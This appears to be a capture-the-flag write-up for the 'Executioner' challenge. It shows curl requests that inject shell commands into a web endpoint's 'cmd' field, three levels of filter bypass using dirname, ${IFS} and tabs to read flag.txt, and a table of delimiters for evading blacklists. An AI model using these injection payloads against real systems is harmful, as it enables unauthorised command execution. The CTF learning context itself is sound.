---
title: "Executioner — Learn-it CTF"
description: "Command injection with progressively stricter filters — bypassing blacklists using IFS, tabs, and dots."
pubDate: 2025-02-08
tags: ["web", "command-injection", "learn-it"]
---

**Category:** Web / Command Injection

## Challenge

A web endpoint accepts a `cmd` field and executes it on the server. Each instance of the challenge adds stricter filters.

## Level 1 — No filter

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"cmd":"cat flag.txt"}' \
  http://ctf.learn-it.org:39983/execute
```

## Level 2 — Filter bypassed with `dirname`

Spaces were filtered or the working directory changed. Navigate up using `dirname`:

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"cmd":"cd $(dirname $PWD); cat flag.txt"}' \
  http://ctf.learn-it.org:39982/execute
```

## Level 3 — Strict filter bypass with `${IFS}` and tabs

Spaces and common delimiters are blocked. Use `${IFS}` (Internal Field Separator) as a space substitute and `\t` as a delimiter:

```bash
curl -X POST -H "Content-Type: application/json" \
  -d '{"cmd":".\t;\tcd${IFS}$(dirname${IFS}$PWD);\tcat${IFS}flag.txt"}' \
  http://ctf.learn-it.org:39981/execute
```

## Useful delimiters for filter bypass

| Character | Use case |
|-----------|----------|
| `\n` | Newline as command separator |
| `\t` | Tab as space substitute |
| `-` | Sometimes accepted where spaces are not |
| `${IFS}` | Shell variable that defaults to space/tab/newline |
